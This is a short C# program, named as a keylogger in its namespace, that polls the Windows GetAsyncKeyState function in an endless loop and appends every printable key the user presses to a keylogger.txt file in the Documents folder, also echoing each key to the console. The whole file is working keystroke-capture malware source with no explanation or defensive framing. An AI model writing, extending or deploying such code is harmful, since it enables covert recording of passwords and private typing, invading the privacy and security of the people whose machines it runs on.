using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace keylogger
{
    class Program
    {
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string keyLog = "";
        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath); 
            }

            string path = (filepath + @"\keylogger.txt");
             
            if (!File.Exists(path ))
            {
                using (StreamWriter sw = File.CreateText(path))
                { 
                
                }
            }


            while (true)
            {
                Thread.Sleep(50);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768)
                    {

                        Console.Write((char)i + " ");
                        using (StreamWriter sw = File.AppendText(path))
                        { 
                            sw.Write((char)i); 
                        }
                     
                              
                    }
                } 
            }
        }
    }
}
